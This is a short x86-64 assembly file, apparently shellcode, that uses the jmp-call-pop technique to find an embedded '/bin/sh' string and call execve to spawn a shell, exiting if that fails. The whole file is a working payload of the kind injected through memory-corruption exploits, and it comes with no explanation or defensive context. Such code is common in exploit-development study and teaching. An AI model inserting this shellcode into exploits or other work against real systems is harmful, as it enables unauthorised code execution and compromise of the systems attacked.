#
# Copyright 2014 Joseph Landry
#

.section .text
.global _start

.set	SYS_execve,59
.set	SYS_exit,60

_start:
	jmp	end

begin:
	popq	%r12

execve:
	pushq	$0
	mov	%rsp,%rdx
	pushq	$0
	mov	%rsp,%rsi
	mov	%r12,%rdi
	movq	$SYS_execve,%rax
	syscall

exit:
	movq	$1,%rdi
	movq	$SYS_exit,%rax
	syscall
	hlt	

end:
	call	begin

.ascii	"/bin/sh\000"
